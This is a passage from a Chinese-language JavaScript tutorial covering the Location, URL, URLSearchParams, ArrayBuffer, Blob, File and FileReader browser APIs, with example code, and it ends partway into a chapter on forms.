      document.location.href = 'http://www.example.com';

   另外， ``Location.href`` 属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的 ``Location.href`` 属性，导致后者的网址跳转。 ``Location`` 的其他属性都不允许跨域写入。

方法
~~~

   **（1）Location.assign()**

    ``assign`` 方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。

   .. code:: javascript

      // 跳转到新的网址
      document.location.assign('http://www.example.com')

   **（2）Location.replace()**

    ``replace`` 方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。

   它与 ``assign`` 方法的差异在于， ``replace`` 会在浏览器的浏览历史 ``History`` 里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。

   .. code:: javascript

      // 跳转到新的网址
      document.location.replace('http://www.example.com')

   **（3）Location.reload()**

    ``reload`` 方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。

   它接受一个布尔值作为参数。如果参数为 ``true`` ，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即 ``scrollTop === 0`` ）。如果参数是 ``false`` 或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。

   .. code:: javascript

      // 向服务器重新请求当前网址
      window.location.reload(true);

   **（4）Location.toString()**

    ``toString`` 方法返回整个 URL 字符串，相当于读取 ``Location.href`` 属性。

URL 的编码和解码
--------------

   网页的 URL 只能包含合法的字符。合法字符分成两类。

   - URL 元字符：分号（ ``;`` ），逗号（ ``,`` ），斜杠（ ``/`` ），问号（ ``?`` ），冒号（ ``:`` ），at（ ``@`` ）， ``&`` ，等号（ ``=`` ），加号（ ``+`` ），美元符号（ ``$`` ），井号（ ``#`` ）
   - 语义字符： ``a-z`` ， ``A-Z`` ， ``0-9`` ，连词号（ ``-`` ），下划线（ ``_`` ），点（ ``.`` ），感叹号（ ``!`` ），波浪线（ ``~`` ），星号（ ``*`` ），单引号（ ``'`` ），圆括号（ ``()`` ）

   除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（ ``%`` ）加上两个大写的十六进制字母。

   比如，UTF-8 的操作系统上， ``http://www.example.com/q=春节`` 这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成 ``http://www.example.com/q=%E6%98%A5%E8%8A%82`` 。其中，“春”转成了 ``%E6%98%A5`` ，“节”转成了 ``%E8%8A%82`` 。这是因为“春”和“节”的 UTF-8 编码分别是 ``E6 98 A5`` 和 ``E8 8A 82`` ，将每个字节前面加上百分号，就构成了 URL 编码。

   JavaScript 提供四个 URL 的编码/解码方法。

   -  ``encodeURI()`` 
   -  ``encodeURIComponent()`` 
   -  ``decodeURI()`` 
   -  ``decodeURIComponent()`` 

encodeURI()
~~~~~~~~~~~~

    ``encodeURI()`` 方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。

   .. code:: javascript

      encodeURI('http://www.example.com/q=春节')
      // "http://www.example.com/q=%E6%98%A5%E8%8A%82"

encodeURIComponent()
~~~~~~~~~~~~~~~~~~~~~

    ``encodeURIComponent()`` 方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。

   .. code:: javascript

      encodeURIComponent('春节')
      // "%E6%98%A5%E8%8A%82"
      encodeURIComponent('http://www.example.com/q=春节')
      // "http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82"

   上面代码中， ``encodeURIComponent()`` 会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。

decodeURI()
~~~~~~~~~~~~

    ``decodeURI()`` 方法用于整个 URL 的解码。它是 ``encodeURI()`` 方法的逆运算。它接受一个参数，就是转码后的 URL。

   .. code:: javascript

      decodeURI('http://www.example.com/q=%E6%98%A5%E8%8A%82')
      // "http://www.example.com/q=春节"

decodeURIComponent()
~~~~~~~~~~~~~~~~~~~~~

    ``decodeURIComponent()`` 用于URL 片段的解码。它是 ``encodeURIComponent()`` 方法的逆运算。它接受一个参数，就是转码后的 URL 片段。

   .. code:: javascript

      decodeURIComponent('%E6%98%A5%E8%8A%82')
      // "春节"

URL 接口
-------

   浏览器原生提供 ``URL()`` 接口，它是一个构造函数，用来构造、解析和编码 URL。一般情况下，通过 ``window.URL`` 可以拿到这个构造函数。

构造函数
~~~~~~~

    ``URL()`` 作为构造函数，可以生成 URL 实例。它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。

   .. code:: javascript

      var url = new URL('http://www.example.com/index.html');
      url.href
      // "http://www.example.com/index.html"

   上面示例生成了一个 URL 实例，用来代表指定的网址。

   除了字符串， ``URL()`` 的参数也可以是另一个 URL 实例。这时， ``URL()`` 会自动读取该实例的 ``href`` 属性，作为实际参数。

   如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。

   .. code:: javascript

      var url1 = new URL('index.html', 'http://example.com');
      url1.href
      // "http://example.com/index.html"
   
      var url2 = new URL('page2.html', 'http://example.com/page1.html');
      url2.href
      // "http://example.com/page2.html"
   
      var url3 = new URL('..', 'http://example.com/a/b.html')
      url3.href
      // "http://example.com/"

   上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是 ``..`` ，表示上层路径。

实例属性
~~~~~~~

   URL 实例的属性与 ``Location`` 对象的属性基本一致，返回当前 URL 的信息。

   - URL.href：返回整个 URL
   - URL.protocol：返回协议，以冒号 ``:`` 结尾
   - URL.hostname：返回域名
   - URL.host：返回域名与端口，包含 ``:`` 号，默认的80和443端口会省略
   - URL.port：返回端口
   - URL.origin：返回协议、域名和端口
   - URL.pathname：返回路径，以斜杠 ``/`` 开头
   - URL.search：返回查询字符串，以问号 ``?`` 开头
   - URL.searchParams：返回一个 ``URLSearchParams`` 实例，该属性是 ``Location`` 对象没有的
   - URL.hash：返回片段识别符，以井号 ``#`` 开头
   - URL.password：返回域名前面的密码
   - URL.username：返回域名前面的用户名

   .. code:: javascript

      var url = new URL('http://user:passwd@www.example.com:4097/path/a.html?x=111#part1');
   
      url.href
      // "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
      url.protocol
      // "http:"
      url.hostname
      // "www.example.com"
      url.host
      // "www.example.com:4097"
      url.port
      // "4097"
      url.origin
      // "http://www.example.com:4097"
      url.pathname
      // "/path/a.html"
      url.search
      // "?x=111"
      url.searchParams
      // URLSearchParams {}
      url.hash
      // "#part1"
      url.password
      // "passwd"
      url.username
      // "user"

   这些属性里面，只有 ``origin`` 属性是只读的，其他属性都可写，并且会立即生效。

   .. code:: javascript

      var url = new URL('http://example.com/index.html#part1');
   
      url.pathname = 'index2.html';
      url.href // "http://example.com/index2.html#part1"
   
      url.hash = '#part2';
      url.href // "http://example.com/index2.html#part2"

   上面代码中，改变 URL 实例的 ``pathname`` 属性和 ``hash`` 属性，都会实时反映在 URL 实例当中。

静态方法
~~~~~~~

   **（1）URL.createObjectURL()**

    ``URL.createObjectURL()`` 方法用来为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了 ``File`` 对象或 ``Blob`` 对象的 URL。

   .. code:: javascript

      // HTML 代码如下
      // <div id="display"/>
      // <input
      //   type="file"
      //   id="fileElem"
      //   multiple
      //   accept="image/*"
      //   onchange="handleFiles(this.files)"
      //  >
      var div = document.getElementById('display');
   
      function handleFiles(files) {
        for (var i = 0; i < files.length; i++) {
          var img = document.createElement('img');
          img.src = window.URL.createObjectURL(files[i]);
          div.appendChild(img);
        }
      }

   上面代码中， ``URL.createObjectURL()`` 方法用来为上传的文件生成一个 URL 字符串，作为 ``<img>`` 元素的图片来源。

   该方法生成的 URL 就像下面的样子。

   .. code:: javascript

      blob:http://localhost/c745ef73-ece9-46da-8f66-ebes574789b1

   注意，每次使用 ``URL.createObjectURL()`` 方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用 ``URL.revokeObjectURL()`` 方法释放这个实例。

   **（2）URL.revokeObjectURL()**

    ``URL.revokeObjectURL()`` 方法用来释放 ``URL.createObjectURL()`` 方法生成的 URL 实例。它的参数就是 ``URL.createObjectURL()`` 方法返回的 URL 字符串。

   下面为上一段的示例加上 ``URL.revokeObjectURL()`` 。

   .. code:: javascript

      var div = document.getElementById('display');
   
      function handleFiles(files) {
        for (var i = 0; i < files.length; i++) {
          var img = document.createElement('img');
          img.src = window.URL.createObjectURL(files[i]);
          div.appendChild(img);
          img.onload = function() {
            window.URL.revokeObjectURL(this.src);
          }
        }
      }

   上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在 ``img.onload`` 回调函数里面，通过 ``URL.revokeObjectURL()`` 方法卸载这个 URL 实例。

URLSearchParams 对象
-------------------


概述
~~~

    ``URLSearchParams`` 对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。

   它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号 ``?`` 有没有都行，也可以是对应查询字符串的数组或对象。

   .. code:: javascript

      // 方法一：传入字符串
      var params = new URLSearchParams('?foo=1&bar=2');
      // 等同于
      var params = new URLSearchParams(document.location.search);
   
      // 方法二：传入数组
      var params = new URLSearchParams([['foo', 1], ['bar', 2]]);
   
      // 方法三：传入对象
      var params = new URLSearchParams({'foo' : 1 , 'bar' : 2});

    ``URLSearchParams`` 会对查询字符串自动编码。

   .. code:: javascript

      var params = new URLSearchParams({'foo': '你好'});
      params.toString() // "foo=%E4%BD%A0%E5%A5%BD"

   上面代码中， ``foo`` 的值是汉字， ``URLSearchParams`` 对其自动进行 URL 编码。

   浏览器向服务器发送表单数据时，可以直接使用 ``URLSearchParams`` 实例作为表单数据。

   .. code:: javascript

      const params = new URLSearchParams({foo: 1, bar: 2});
      fetch('https://example.com/api', {
        method: 'POST',
        body: params
      }).then(...)

   上面代码中， ``fetch`` 命令向服务器发送命令时，可以直接使用 ``URLSearchParams`` 实例。

    ``URLSearchParams`` 可以与 ``URL()`` 接口结合使用。

   .. code:: javascript

      var url = new URL(window.location);
      var foo = url.searchParams.get('foo') || 'somedefault';

   上面代码中，URL 实例的 ``searchParams`` 属性就是一个 ``URLSearchParams`` 实例，所以可以使用 ``URLSearchParams`` 接口的 ``get`` 方法。

    ``URLSearchParams`` 实例有遍历器接口，可以用 ``for...of`` 循环遍历（详见《ES6 标准入门》的《Iterator》一章）。

   .. code:: javascript

      var params = new URLSearchParams({'foo': 1 , 'bar': 2});
   
      for (var p of params) {
        console.log(p[0] + ': ' + p[1]);
      }
      // foo: 1
      // bar: 2

    ``URLSearchParams`` 没有实例属性，只有实例方法。

URLSearchParams.toString()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``toString`` 方法返回实例的字符串形式。

   .. code:: javascript

      var url = new URL('https://example.com?foo=1&bar=2');
      var params = new URLSearchParams(url.search);
   
      params.toString() // "foo=1&bar=2'

   那么需要字符串的场合，会自动调用 ``toString`` 方法。

   .. code:: javascript

      var params = new URLSearchParams({version: 2.0});
      window.location.href = location.pathname + '?' + params;

   上面代码中， ``location.href`` 赋值时，可以直接使用 ``params`` 对象。这时就会自动调用 ``toString`` 方法。

URLSearchParams.append()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``append()`` 方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。

   .. code:: javascript

      var params = new URLSearchParams({'foo': 1 , 'bar': 2});
      params.append('baz', 3);
      params.toString() // "foo=1&bar=2&baz=3"

    ``append()`` 方法不会识别是否键名已经存在。

   .. code:: javascript

      var params = new URLSearchParams({'foo': 1 , 'bar': 2});
      params.append('foo', 3);
      params.toString() // "foo=1&bar=2&foo=3"

   上面代码中，查询字符串里面 ``foo`` 已经存在了，但是 ``append`` 依然会追加一个同名键。

URLSearchParams.delete()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``delete()`` 方法用来删除指定的查询参数。它接受键名作为参数。

   .. code:: javascript

      var params = new URLSearchParams({'foo': 1 , 'bar': 2});
      params.delete('bar');
      params.toString() // "foo=1"

URLSearchParams.has()
~~~~~~~~~~~~~~~~~~~~~~

    ``has()`` 方法返回一个布尔值，表示查询字符串是否包含指定的键名。

   .. code:: javascript

      var params = new URLSearchParams({'foo': 1 , 'bar': 2});
      params.has('bar') // true
      params.has('baz') // false

URLSearchParams.set()
~~~~~~~~~~~~~~~~~~~~~~

    ``set()`` 方法用来设置查询字符串的键值。

   它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。

   .. code:: javascript

      var params = new URLSearchParams('?foo=1');
      params.set('foo', 2);
      params.toString() // "foo=2"
      params.set('bar', 3);
      params.toString() // "foo=2&bar=3"

   上面代码中， ``foo`` 是已经存在的键， ``bar`` 是还不存在的键。

   如果有多个的同名键， ``set`` 会移除现存所有的键。

   .. code:: javascript

      var params = new URLSearchParams('?foo=1&foo=2');
      params.set('foo', 3);
      params.toString() // "foo=3"

   下面是一个替换当前 URL 的例子。

   .. code:: javascript

      // URL: https://example.com?version=1.0
      var params = new URLSearchParams(location.search.slice(1));
      params.set('version', '2.0');
   
      window.history.replaceState({}, '', location.pathname +  ``?``  + params);
      // URL: https://example.com?version=2.0

URLSearchParams.get()，URLSearchParams.getAll()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``get()`` 方法用来读取查询字符串里面的指定键。它接受键名作为参数。

   .. code:: javascript

      var params = new URLSearchParams('?foo=1');
      params.get('foo') // "1"
      params.get('bar') // null

   两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是 ``null`` 。

   如果有多个的同名键， ``get`` 返回位置最前面的那个键值。

   .. code:: javascript

      var params = new URLSearchParams('?foo=3&foo=2&foo=1');
      params.get('foo') // "3"

   上面代码中，查询字符串有三个 ``foo`` 键， ``get`` 方法返回最前面的键值 ``3`` 。

    ``getAll()`` 方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。

   .. code:: javascript

      var params = new URLSearchParams('?foo=1&foo=2');
      params.getAll('foo') // ["1", "2"]

   上面代码中，查询字符串有两个 ``foo`` 键， ``getAll`` 返回的数组就有两个成员。

URLSearchParams.sort()
~~~~~~~~~~~~~~~~~~~~~~~

    ``sort()`` 方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。

   该方法没有返回值，或者说返回值是 ``undefined`` 。

   .. code:: javascript

      var params = new URLSearchParams('c=4&a=2&b=3&a=1');
      params.sort();
      params.toString() // "a=2&a=1&b=3&c=4"

   上面代码中，如果有两个同名的键 ``a`` ，它们之间不会排序，而是保留原始的顺序。

URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



   .. code:: javascript

      var params = new URLSearchParams('a=1&b=2');
   
      for(var p of params.keys()) {
        console.log(p);
      }
      // a
      // b
   
      for(var p of params.values()) {
        console.log(p);
      }
      // 1
      // 2
   
      for(var p of params.entries()) {
        console.log(p);
      }
      // ["a", "1"]
      // ["b", "2"]

   如果直接对 ``URLSearchParams`` 进行遍历，其实内部调用的就是 ``entries`` 接口。

   .. code:: javascript

      for (var p of params) {}
      // 等同于
      for (var p of params.entries()) {}

参考链接
-------

   - [Location](https://developer.mozilla.org/en-US/docs/Web/API/Location), by MDN
   - [URL](https://developer.mozilla.org/en-US/docs/Web/API/URL), by MDN
   - [URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams), by MDN
   - [Easy URL Manipulation with URLSearchParams](https://developers.google.com/web/updates/2016/01/urlsearchparams?hl=en), by Eric Bidelman

/🟠 ArrayBuffer 对象，Blob 对象
==============================

ArrayBuffer 对象
---------------

   ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。这个对象可以看作内存数据的表达。

   这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。

   浏览器原生提供 ``ArrayBuffer()`` 构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。

   .. code:: javascript

      var buffer = new ArrayBuffer(8);

   上面代码中，实例对象 ``buffer`` 占用8个字节。

   ArrayBuffer 对象有实例属性 ``byteLength`` ，表示当前实例占用的内存长度（单位字节）。

   .. code:: javascript

      var buffer = new ArrayBuffer(8);
      buffer.byteLength // 8

   ArrayBuffer 对象有实例方法 ``slice()`` ，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。

   .. code:: javascript

      var buf1 = new ArrayBuffer(8);
      var buf2 = buf1.slice(0);

   上面代码表示复制原来的实例。

Blob 对象
---------


简介
~~~

   Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object （二进制大型对象）的缩写。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。

   浏览器原生提供 ``Blob()`` 构造函数，用来生成实例对象。

   .. code:: javascript

      new Blob(array [, options])

    ``Blob`` 构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的 ``Blob`` 实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性 ``type`` ，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。

   .. code:: javascript

      var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
      var myBlob = new Blob(htmlFragment, {type : 'text/html'});

   上面代码中，实例对象 ``myBlob`` 包含的是字符串。生成实例的时候，数据类型指定为 ``text/html`` 。

   下面是另一个例子，Blob 保存 JSON 数据。

   .. code:: javascript

      var obj = { hello: 'world' };
      var blob = new Blob([ JSON.stringify(obj) ], {type : 'application/json'});

实例属性和实例方法
~~~~~~~~~~~~~~~

    ``Blob`` 具有两个实例属性 ``size`` 和 ``type`` ，分别返回数据的大小和类型。

   .. code:: javascript

      var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
      var myBlob = new Blob(htmlFragment, {type : 'text/html'});
   
      myBlob.size // 32
      myBlob.type // "text/html"

    ``Blob`` 具有一个实例方法 ``slice`` ，用来拷贝原来的数据，返回的也是一个 ``Blob`` 实例。

   .. code:: javascript

      myBlob.slice(start, end, contentType)

    ``slice`` 方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为 ``size`` 属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。

获取文件信息
~~~~~~~~~~

   文件选择器 ``<input type="file">`` 用来让用户选取文件。出于安全考虑，浏览器不允许脚本自行设置这个控件的 ``value`` 属性，即文件必须是用户手动选取的，不能是脚本指定的。一旦用户选好了文件，脚本就可以读取这个文件。

   文件选择器返回一个 FileList 对象，该对象是一个类似数组的成员，每个成员都是一个 File 实例对象。File 实例对象是一个特殊的 Blob 实例，增加了 ``name`` 和 ``lastModifiedDate`` 属性。

   .. code:: javascript

      // HTML 代码如下
      // <input type="file" accept="image/*" multiple onchange="fileinfo(this.files)"/>
   
      function fileinfo(files) {
        for (var i = 0; i < files.length; i++) {
          var f = files[i];
          console.log(
            f.name, // 文件名，不含路径
            f.size, // 文件大小，Blob 实例属性
            f.type, // 文件类型，Blob 实例属性
            f.lastModifiedDate // 文件的最后修改时间
          );
        }
      }

   除了文件选择器，拖放 API 的 ``dataTransfer.files`` 返回的也是一个FileList 对象，它的成员因此也是 File 实例对象。

下载文件
~~~~~~~

   AJAX 请求时，如果指定 ``responseType`` 属性为 ``blob`` ，下载下来的就是一个 Blob 对象。

   .. code:: javascript

      function getBlob(url, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url);
        xhr.responseType = 'blob';
        xhr.onload = function () {
          callback(xhr.response);
        }
        xhr.send(null);
      }

   上面代码中， ``xhr.response`` 拿到的就是一个 Blob 对象。

生成 URL
~~~~~~~~

   浏览器允许使用 ``URL.createObjectURL()`` 方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以 ``blob://`` 开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与 ``data://URL`` （URL 包含实际数据）和 ``file://URL`` （本地文件系统里面的文件）都不一样。

   .. code:: javascript

      var droptarget = document.getElementById('droptarget');
   
      droptarget.ondrop = function (e) {
        var files = e.dataTransfer.files;
        for (var i = 0; i < files.length; i++) {
          var type = files[i].type;
          if (type.substring(0,6) !== 'image/')
            continue;
          var img = document.createElement('img');
          img.src = URL.createObjectURL(files[i]);
          img.onload = function () {
            this.width = 100;
            document.body.appendChild(this);
            URL.revokeObjectURL(this.src);
          }
        }
      }

   上面代码通过为拖放的图片文件生成一个 URL，产生它们的缩略图，从而使得用户可以预览选择的文件。

   浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。

读取文件
~~~~~~~

   取得 Blob 对象以后，可以通过 ``FileReader`` 对象，读取 Blob 对象的内容，即文件内容。

   FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。

   -  ``FileReader.readAsText()`` ：返回文本，需要指定文本编码，默认为 UTF-8。
   -  ``FileReader.readAsArrayBuffer()`` ：返回 ArrayBuffer 对象。
   -  ``FileReader.readAsDataURL()`` ：返回 Data URL。
   -  ``FileReader.readAsBinaryString()`` ：返回原始的二进制字符串。

   下面是 ``FileReader.readAsText()`` 方法的例子，用来读取文本文件。

   .. code:: javascript

      // HTML 代码如下
      // <input type="file" onchange="readfile(this.files[0])"></input>
      // <pre id="output"></pre>
      function readfile(f) {
        var reader = new FileReader();
        reader.readAsText(f);
        reader.onload = function () {
          var text = reader.result;
          var out = document.getElementById('output');
          out.innerHTML = '';
          out.appendChild(document.createTextNode(text));
        }
        reader.onerror = function(e) {
          console.log('Error', e);
        };
      }

   上面代码中，通过指定 FileReader 实例对象的 ``onload`` 监听函数，在实例的 ``result`` 属性上拿到文件内容。

   下面是 ``FileReader.readAsArrayBuffer()`` 方法的例子，用于读取二进制文件。

   .. code:: javascript

      // HTML 代码如下
      // <input type="file" onchange="typefile(this.files[0])"></input>
      function typefile(file) {
        // 文件开头的四个字节，生成一个 Blob 对象
        var slice = file.slice(0, 4);
        var reader = new FileReader();
        // 读取这四个字节
        reader.readAsArrayBuffer(slice);
        reader.onload = function (e) {
          var buffer = reader.result;
          // 将这四个字节的内容，视作一个32位整数
          var view = new DataView(buffer);
          var magic = view.getUint32(0, false);
          // 根据文件的前四个字节，判断它的类型
          switch(magic) {
            case 0x89504E47: file.verified_type = 'image/png'; break;
            case 0x47494638: file.verified_type = 'image/gif'; break;
            case 0x25504446: file.verified_type = 'application/pdf'; break;
            case 0x504b0304: file.verified_type = 'application/zip'; break;
          }
          console.log(file.name, file.verified_type);
        };
      }

/🟠 File 对象，FileList 对象，FileReader 对象
==========================================


File 对象
---------

   File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。

   最常见的使用场合是表单的文件上传控件（ ``<input type="file">`` ），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。

   .. code:: javascript

      // HTML 代码如下
      // <input id="fileItem" type="file">
      var file = document.getElementById('fileItem').files[0];
      file instanceof File // true

   上面代码中， ``file`` 是用户选中的第一个文件，它是 File 的实例。

构造函数
~~~~~~~

   浏览器原生提供一个 ``File()`` 构造函数，用来生成 File 实例对象。

   .. code:: javascript

      new File(array, name [, options])

    ``File()`` 构造函数接受三个参数。

   - array：一个数组，成员可以是二进制对象或字符串，表示文件的内容。
   - name：字符串，表示文件名或文件路径。
   - options：配置对象，设置实例的属性。该参数可选。

   第三个参数配置对象，可以设置两个属性。

   - type：字符串，表示实例对象的 MIME 类型，默认值为空字符串。
   - lastModified：时间戳，表示上次修改的时间，默认为 ``Date.now()`` 。

   下面是一个例子。

   .. code:: javascript

      var file = new File(
        ['foo'],
        'foo.txt',
        {
          type: 'text/plain',
        }
      );

实例属性和实例方法
~~~~~~~~~~~~~~~

   File 对象有以下实例属性。

   - File.lastModified：最后修改时间
   - File.name：文件名或文件路径
   - File.size：文件大小（单位字节）
   - File.type：文件的 MIME 类型

   .. code:: javascript

      var myFile = new File([], 'file.bin', {
        lastModified: new Date(2018, 1, 1),
      });
      myFile.lastModified // 1517414400000
      myFile.name // "file.bin"
      myFile.size // 0
      myFile.type // ""

   上面代码中，由于 ``myFile`` 的内容为空，也没有设置 MIME 类型，所以 ``size`` 属性等于0， ``type`` 属性等于空字符串。

   File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法 ``slice()`` 。

FileList 对象
------------

    ``FileList`` 对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。

   - 文件控件节点（ ``<input type="file">`` ）的 ``files`` 属性，返回一个 FileList 实例。
   - 拖拉一组文件时，目标区的 ``DataTransfer.files`` 属性，返回一个 FileList 实例。

   .. code:: javascript

      // HTML 代码如下
      // <input id="fileItem" type="file">
      var files = document.getElementById('fileItem').files;
      files instanceof FileList // true

   上面代码中，文件控件的 ``files`` 属性是一个 FileList 实例。

   FileList 的实例属性主要是 ``length`` ，表示包含多少个文件。

   FileList 的实例方法主要是 ``item()`` ，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即 ``myFileList[0]`` 等同于 ``myFileList.item(0)`` ，所以一般用不到 ``item()`` 方法。

FileReader 对象
--------------

   FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。

   浏览器原生提供一个 ``FileReader`` 构造函数，用来生成 FileReader 实例。

   .. code:: javascript

      var reader = new FileReader();

   FileReader 有以下的实例属性。

   - FileReader.error：读取文件时产生的错误对象
   - FileReader.readyState：整数，表示读取文件时的当前状态。一共有三种可能的状态， ``0`` 表示尚未加载任何数据， ``1`` 表示数据正在加载， ``2`` 表示加载完成。
   - FileReader.result：读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。
   - FileReader.onabort： ``abort`` 事件（用户终止读取操作）的监听函数。
   - FileReader.onerror： ``error`` 事件（读取错误）的监听函数。
   - FileReader.onload： ``load`` 事件（读取操作完成）的监听函数，通常在这个函数里面使用 ``result`` 属性，拿到文件内容。
   - FileReader.onloadstart： ``loadstart`` 事件（读取操作开始）的监听函数。
   - FileReader.onloadend： ``loadend`` 事件（读取操作结束）的监听函数。
   - FileReader.onprogress： ``progress`` 事件（读取操作进行中）的监听函数。

   下面是监听 ``load`` 事件的一个例子。

   .. code:: javascript

      // HTML 代码如下
      // <input type="file" onchange="onChange(event)">
   
      function onChange(event) {
        var file = event.target.files[0];
        var reader = new FileReader();
        reader.onload = function (event) {
          console.log(event.target.result)
        };
   
        reader.readAsText(file);
      }

   上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（ ``load`` 事件发生），就打印出文件内容。

   FileReader 有以下实例方法。

   - FileReader.abort()：终止读取操作， ``readyState`` 属性将变成 ``2`` 。
   - FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后 ``result`` 属性将返回一个 ArrayBuffer 实例。
   - FileReader.readAsBinaryString()：读取完成后， ``result`` 属性将返回原始的二进制字符串。
   - FileReader.readAsDataURL()：读取完成后， ``result`` 属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于 ``<img>`` 元素的 ``src`` 属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀 ``data:*/*;base64,`` 从字符串里删除以后，再进行解码。
   - FileReader.readAsText()：读取完成后， ``result`` 属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。

   下面是一个例子。

   .. code:: javascript

      /* HTML 代码如下
        <input type="file" onchange="previewFile()">
        <img src="" height="200">
      */
   
      function previewFile() {
        var preview = document.querySelector('img');
        var file    = document.querySelector('input[type=file]').files[0];
        var reader  = new FileReader();
   
        reader.addEventListener('load', function () {
          preview.src = reader.result;
        }, false);
   
        if (file) {
          reader.readAsDataURL(file);
        }
      }

   上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给 ``<img>`` 元素的 ``src`` 属性，从而把图片展示出来。

/🟠 表单，FormData 对象
======================

表单概述
-------

   表单（ ``<form>`` ）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。

   .. code:: html

      <form action="/handling-page" method="post">
        <div>
          <label for="name">用户名：</label>
          <input type="text" id="name" name="user_name" />
        </div>
        <div>
          <label for="passwd">密码：</label>
          <input type="password" id="passwd" name="user_passwd" />
        </div>
        <div>
